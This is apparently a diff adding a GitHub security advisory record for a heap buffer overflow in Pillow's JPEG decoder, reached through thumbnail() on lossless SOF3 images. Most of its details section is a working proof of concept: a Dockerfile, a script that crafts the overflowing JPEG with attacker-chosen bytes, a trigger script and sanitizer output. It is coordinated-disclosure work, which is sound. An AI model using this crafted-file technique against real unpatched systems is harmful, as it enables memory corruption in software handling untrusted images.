@@ -1,0 +1,167 @@
+{
+  "id": "GHSA-8g5g-8vmr-9782",
+  "modified": "2026-10-20T21:00:04.391412542Z",
+  "published": "2026-10-20T20:40:07Z",
+  "aliases": [
+    "CVE-2026-112403"
+  ],
+  "summary": "Pillow: Heap buffer overflow in ImagingJpegDecode",
+  "details": "## Summary\n\n`JpegImageFile.draft()` — which `Image.thumbnail()` calls automatically — requests 1/2, 1/4 or 1/8 scaled JPEG output and shrinks `self._size` and the tile extents to match, so `_setimage()` allocates a single-row decode buffer of `ceil(W/s)` samples. `ImagingJpegDecode()` sets `cinfo.scale_num`/`scale_denom`, calls `jpeg_start_decompress()`, and then reads scanlines into that buffer without ever comparing `cinfo.output_width`, `cinfo.output_height` or `cinfo.out_color_components` against `state-\u003exsize`, `state-\u003eysize` and `state-\u003ebits`.\n\nlibjpeg-turbo 3.x decodes lossless (SOF3) JPEG, but hardwires lossless streams to no scaling — the requested `scale_denom` is silently discarded. It therefore returns full-width `W`-sample rows into a buffer sized for `ceil(W/s)`. Each `jpeg_read_scanlines()` call writes `(W - ceil(W/s)) x components` bytes past the end of the heap allocation, and the overflowing bytes are the decoded pixel values, which are byte-exact for an 8-bit grayscale lossless image.\n\nThe input is a standards-compliant JPEG, so `Image.open(..., formats=[\"JPEG\"])` does not prevent it. Pillow's Python SOF parser already accepts marker `0xFFC3` (\"SOF3\", \"Spatial lossless\") at 8-bit precision, so the file opens normally as a `JPEG` / mode `L` image at its full declared size.\n\n## Affected code\n\nAt `e41083f383c9cd3db95de52564cc0b6452313d4a` (`main`, 2026-08-29):\n\n- `src/libImaging/JpegDecode.c:224-262` — `ImagingJpegDecode()`; `jpeg_start_decompress()` at :240, `jpeg_read_scanlines()` at :252, with no geometry check between them.\n- `src/decode.c:222-231` — `_setimage()`; `state-\u003ebuffer = calloc(1, state-\u003ebytes)` with `state-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8`.\n- `src/PIL/JpegImagePlugin.py:428-464` — `JpegImageFile.draft()`; computes `s` and shrinks `_size`, the tile extents and `decoderconfig` with no notion of lossless coding.\n- `src/PIL/JpegImagePlugin.py:271` — `0xFFC3: (\"SOF3\", \"Spatial lossless\", SOF)`.\n\n```c\n// src/libImaging/JpegDecode.c\n            if (context-\u003escale \u003e 1) {\n                context-\u003ecinfo.scale_num = 1;\n                context-\u003ecinfo.scale_denom = context-\u003escale;\n            }\n            ...\n        case 2:\n            if (!jpeg_start_decompress(\u0026context-\u003ecinfo)) {\n                break;\n            }\n            state-\u003estate++;\n            /* fall through */\n        case 3:\n            ok = 1;\n            while (state-\u003ey \u003c state-\u003eysize) {\n                ok = jpeg_read_scanlines(\u0026context-\u003ecinfo, \u0026state-\u003ebuffer, 1);\n```\n\nBecause `state-\u003eysize` (`ceil(H/s)`) can never equal libjpeg's `output_height` when `s \u003e= 2`, the decode always ends in an error after the rows have already been written: the caller sees an exception and gets no pixels back. The `OSError` is a consequence of the overflow, not the issue being reported.\n\n## Primitive\n\nPer scanline: a contiguous write of `(W - ceil(W/s)) x c` bytes immediately past a `calloc(ceil(W/s) x c)` block, where `c = 1` for mode `L` and 4 for RGB (RGBX) and CMYK; repeated for `ceil(H/s)` rows over the same region. The buffer size class is chosen by the attacker through `W`, and for grayscale the overflowing content is an arbitrary attacker-chosen byte string.\n\nMeasured in the reproducer below: 1200x1100 mode `L`, `s=2` — a 600-byte allocation, 600 bytes written past it, ASan reporting the whole 1200-byte row write as one `memcpy`.\n\nThreshold: `draft()` must select `s \u003e= 2`, i.e. `W // requested_w \u003e= 2` and `H // requested_h \u003e= 2`. For `thumbnail((256,256))` with the default `reducing_gap=2.0` that means `W, H \u003e= 1024`.\n\n## Reproduction\n\nSelf-contained Docker reproducer (Ubuntu 24.04, clang 20, libjpeg-turbo 3.1.4 and Pillow both built from source with `-fsanitize=address`; Pillow checked out at `${TARGET_COMMIT}`, default `e41083f383c9cd3db95de52564cc0b6452313d4a`). Save the three files below as `Dockerfile`, `make_sof3.py` and `trigger.py` in an empty directory, then:\n\n```bash\ndocker build -t pillow-sof3-oob . \u0026\u0026 docker run --rm pillow-sof3-oob\n```\n\n`make_sof3.py` is a self-contained encoder that emits a standards-compliant 8-bit grayscale lossless-Huffman JPEG (SOI / DHT / SOF3 `P=8, Y=1100, X=1200, Nf=1` / SOS `Ss=1` predictor 1, `Se=0`, `Ah=Al=0` / entropy-coded row differences / EOI), whose rows carry a repeating marker pattern. `trigger.py` opens it and calls `thumbnail()`, whose implicit `draft()` picks `s=2` and allocates a 600-byte row buffer.\n\n### `Dockerfile`\n\n```dockerfile\nFROM ubuntu:24.04\nENV DEBIAN_FRONTEND=noninteractive\nARG TARGET_COMMIT=e41083f383c9cd3db95de52564cc0b6452313d4a\nARG CLANG_VERSION=20\nARG LIBJPEG_TURBO_TAG=3.1.4\n\nRUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n        ca-certificates git make cmake nasm pkg-config libc6-dev gcc \\\n        wget gnupg lsb-release software-properties-common \\\n        python3 python3-dev python3-pip python3-venv zlib1g-dev \\\n    \u0026\u0026 wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh \u0026\u0026 chmod +x /tmp/llvm.sh \u0026\u0026 /tmp/llvm.sh ${CLANG_VERSION} \\\n    \u0026\u0026 apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \\\n    \u0026\u0026 rm -rf /var/lib/apt/lists/*\n\nENV CC=clang-20\nENV CXX=clang++-20\nENV CFLAGS=\"-g -fno-omit-frame-pointer -O1 -fsanitize=address\"\nENV CXXFLAGS=\"-g -fno-omit-frame-pointer -O1 -fsanitize=address\"\nENV LDFLAGS=\"-fsanitize=address\"\n\n# --- libjpeg-turbo 3.x (lossless SOF3 support) built with ASan ---\nRUN git clone https://github.com/libjpeg-turbo/libjpeg-turbo /src/libjpeg-turbo\nRUN cd /src/libjpeg-turbo \u0026\u0026 git checkout ${LIBJPEG_TURBO_TAG} \\\n    \u0026\u0026 cmake -B /build/ljt -S . -DCMAKE_BUILD_TYPE=None \\\n        -DCMAKE_C_COMPILER=clang-20 \\\n        -DCMAKE_C_FLAGS=\"$CFLAGS\" \\\n        -DCMAKE_EXE_LINKER_FLAGS=\"$LDFLAGS\" \\\n        -DCMAKE_SHARED_LINKER_FLAGS=\"$LDFLAGS\" \\\n        -DCMAKE_INSTALL_PREFIX=/opt/ljt -DWITH_JPEG8=0 -DENABLE_STATIC=0 \\\n    \u0026\u0026 cmake --build /build/ljt -j\"$(nproc)\" \u0026\u0026 cmake --install /build/ljt\n\n# --- Pillow at the pinned commit, built with ASan against that libjpeg ---\nRUN git clone https://github.com/python-pillow/Pillow /src/repo\nWORKDIR /src/repo\nRUN git checkout ${TARGET_COMMIT}\n\nENV JPEG_ROOT=/opt/ljt\nENV LD_LIBRARY_PATH=/opt/ljt/lib\nRUN python3 -m venv /venv \\\n    \u0026\u0026 /venv/bin/pip install --quiet --upgrade pip \"setuptools\u003e=80\" wheel pybind11 \\\n    \u0026\u0026 CFLAGS=\"$CFLAGS\" LDFLAGS=\"$LDFLAGS -Wl,-rpath,/opt/ljt/lib\" \\\n       /venv/bin/pip install --no-build-isolation --no-deps . \\\n    \u0026\u0026 ln -sf \"$(clang-20 -print-file-name=libclang_rt.asan-x86_64.so)\" /opt/libasan.so \\\n    \u0026\u0026 LD_PRELOAD=/opt/libasan.so ASAN_OPTIONS=detect_leaks=0 \\\n       /venv/bin/python3 -c \"from PIL import Image, features; print(Image.__version__, features.version('jpg'))\"\n\nCOPY make_sof3.py /tmp/make_sof3.py\nCOPY trigger.py /tmp/trigger.py\nRUN python3 /tmp/make_sof3.py /tmp/sof3_gray_1200x1100.jpg\n\nENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1\nENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-20/bin/llvm-symbolizer\nENV LD_PRELOAD=/opt/libasan.so\nCMD [\"/bin/sh\",\"-c\",\"cd /tmp \u0026\u0026 /venv/bin/python3 /tmp/trigger.py 2\u003e\u00261; echo EXIT=$?\"]\n```\n\n### `make_sof3.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"Generate an 8-bit grayscale lossless-Huffman (SOF3) JPEG.\n\nStandards-compliant per ITU-T T.81 Annex H (lossless mode), predictor 1 (Ra).\nRows carry an attacker-chosen marker byte pattern verbatim (lossless =\u003e exact).\n\"\"\"\nimport struct\nimport sys\n\nW = 1200\nH = 1100\nMARKER = b\"AAAABBBBCCCCDDDD\"  # attacker-chosen bytes that land past the buffer\n\n\nclass BitWriter:\n    def __init__(self):\n        self.out = bytearray()\n        self.acc = 0\n        self.n = 0\n\n    def put(self, value, nbits):\n        for i in range(nbits - 1, -1, -1):\n            self.acc = (self.acc \u003c\u003c 1) | ((value \u003e\u003e i) \u0026 1)\n            self.n += 1\n            if self.n == 8:\n                self.out.append(self.acc)\n                if self.acc == 0xFF:\n                    self.out.append(0x00)  # byte stuffing\n                self.acc = 0\n                self.n = 0\n\n    def flush(self):\n        while self.n:\n            self.put(1, 1)\n        return bytes(self.out)\n\n\n# Canonical Huffman: 17 symbols (categories 0..16), all of code length 5.\nBITS = [0] * 17\nBITS[5] = 17\nHUFFVAL = list(range(17))\nCODES = {sym: (i, 5) for i, sym in enumerate(HUFFVAL)}\n\n\ndef category(d):\n    if d == 0:\n        return 0\n    return abs(d).bit_length()\n\n\ndef build_pixels():\n    rows = []\n    for y in range(H):\n        row = bytearray()\n        while len(row) \u003c W:\n            row += MARKER\n        rows.append(bytes(row[:W]))\n    return rows\n\n\ndef main(path):\n    rows = build_pixels()\n    bw = BitWriter()\n    prev = None\n    for y in range(H):\n        row = rows[y]\n        for x in range(W):\n            s = row[x]\n            if y == 0 and x == 0:\n                pred = 1 \u003c\u003c 7          # 2^(P-1-Pt)\n            elif x == 0:\n                pred = prev[0]         # Rb for first sample of a line\n            else:\n                pred = row[x - 1]      # Ra, predictor 1\n            d = (s - pred) \u0026 0xFFFF\n            if d \u003e= 0x8000:\n                d -= 0x10000\n            ssss = category(d)\n            code, length = CODES[ssss]\n            bw.put(code, length)\n            if ssss:\n                v = d if d \u003e 0 else d + (1 \u003c\u003c ssss) - 1\n                bw.put(v \u0026 ((1 \u003c\u003c ssss) - 1), ssss)\n        prev = row\n    entropy = bw.flush()\n\n    out = bytearray()\n    out += b\"\\xff\\xd8\"                                        # SOI\n    # DHT: class 0 (DC/lossless), table id 0\n    dht = bytes([0x00]) + bytes(BITS[1:17]) + bytes(HUFFVAL)\n    out += b\"\\xff\\xc4\" + struct.pack(\"\u003eH\", len(dht) + 2) + dht\n    # SOF3: lossless, Huffman, sequential\n    sof = struct.pack(\"\u003eBHHB\", 8, H, W, 1) + bytes([1, 0x11, 0])\n    out += b\"\\xff\\xc3\" + struct.pack(\"\u003eH\", len(sof) + 2) + sof\n    # SOS: Ns=1, Cs=1, Td=0/Ta=0, Ss=1 (predictor 1), Se=0, Ah=0/Al=0\n    sos = bytes([1, 1, 0x00, 1, 0, 0])\n    out += b\"\\xff\\xda\" + struct.pack(\"\u003eH\", len(sos) + 2) + sos\n    out += entropy\n    out += b\"\\xff\\xd9\"                                        # EOI\n    with open(path, \"wb\") as f:\n        f.write(bytes(out))\n    print(f\"wrote {path}: {len(out)} bytes, {W}x{H} 8-bit grayscale SOF3 lossless\")\n\n\nif __name__ == \"__main__\":\n    main(sys.argv[1] if len(sys.argv) \u003e 1 else \"/tmp/sof3_gray_1200x1100.jpg\")\n```\n\n### `trigger.py`\n\n```python\nimport sys\nfrom PIL import Image, features\nprint(\"Pillow\", Image.__version__, \"| libjpeg\", features.version(\"jpg\"), flush=True)\nim = Image.open(\"/tmp/sof3_gray_1200x1100.jpg\")\nprint(\"format=%s mode=%s size=%s\" % (im.format, im.mode, im.size), flush=True)\nprint(\"\u003e\u003e\u003e im.thumbnail((256, 256))  # draft() picks s=2 -\u003e 600-byte row buffer\", flush=True)\nsys.stdout.flush()\ntry:\n    im.thumbnail((256, 256))\n    print(\"thumbnail returned, size=%s\" % (im.size,), flush=True)\nexcept Exception as e:\n    print(\"exception: %r\" % (e,), flush=True)\n```\n\nValidated output:\n\n```\nPillow 13.0.0.dev0 | libjpeg 6.2\nformat=JPEG mode=L size=(1200, 1100)\n\u003e\u003e\u003e im.thumbnail((256, 256))  # draft() picks s=2 -\u003e 600-byte row buffer\n=================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x74e4e904aad8 at pc 0x7784ea4f9422\nWRITE of size 1200 at 0x74e4e904aad8 thread T0\n    #0 __asan_memcpy\n    #1 jcopy_sample_rows /src/libjpeg-turbo/src/wrapper/../jutils.c:121:5\n    #2 sep_upsample /src/libjpeg-turbo/src/wrapper/../jdsample.c:100:3\n    #3 process_data_simple_main /src/libjpeg-turbo/src/wrapper/../jdmainct.c:317:3\n    #4 jpeg_read_scanlines /src/libjpeg-turbo/src/wrapper/../jdapistd.c:359:3\n    #5 ImagingJpegDecode /src/repo/src/libImaging/JpegDecode.c:252:22\n    #6 _decode /src/repo/src/decode.c:132:14\n\n0x74e4e904aad8 is located 0 bytes after 600-byte region [0x74e4e904a880,0x74e4e904aad8)\nallocated by thread T0 here:\n    #0 calloc\n    #1 _setimage /src/repo/src/decode.c:230:34\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow in __asan_memcpy\n```\n\nNegative control, same image: a baseline DCT JPEG of identical dimensions thumbnails cleanly, because libjpeg honours 1/2 scaling exactly as `draft()` computed it.\n\n```\ncontrol baseline DCT JPEG: JPEG L (1200, 1100)\nthumbnail OK, size = (256, 235) -- no ASan report\n```\n\n## Scope and caveats\n\n- Reproduced on `main` at `e41083f383c9cd3db95de52564cc0b6452313d4a`, which is current `origin/main` as of 2026-08-30. Also reported against 12.3.0.\n- Requires the linked libjpeg to support lossless decoding, i.e. libjpeg-turbo \u003e= 3.0. That is what the official Pillow wheels bundle. Builds against libjpeg-turbo 2.x or IJG libjpeg reject SOF3 before any row is decoded and are not affected.\n- No non-default Pillow configuration is involved: `Image.thumbnail()` calls `draft()` by default, and the triggering bytes are entirely file data.\n- Only paths that use `draft()` before loading are affected. `open().load()` and `resize()` decode at scale 1 and are unaffected. Calling `img.load()` before `thumbnail()`, or `thumbnail(..., reducing_gap=None)`, avoids the path in an application today.\n- Not affected on the same code path: SOF11 (arithmetic lossless) fails with `JERR_ARITH_NOTIMPL` before any row; 12- and 16-bit lossless are rejected by Pillow's `SOF()` because it requires `bits == 8`; SOF5-7/13-15 fail with `JERR_SOF_UNSUPPORTED`.\n\n\n## Credit and disclosure\n\nFound by Anthropic using Claude to study the security of open-source software, validated manually by Ada Logics.\n\nThis report follows Anthropic's coordinated vulnerability disclosure policy\n(https://www.anthropic.com/coordinated-vulnerability-disclosure), with a 90-day\ndisclosure window from the date of this report.\n\nCredit goes to Claude (Anthropic) and Ada Logics.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "13.0.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "1.7.8",
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "12.3.0",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 12.3.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8g5g-8vmr-9782/GHSA-8g5g-8vmr-9782.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-8g5g-8vmr-9782"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112403"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/242a059aedc1935097d9aa1dc3f099750467ba75"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/13.0.0"
+    }
+  ]
+}
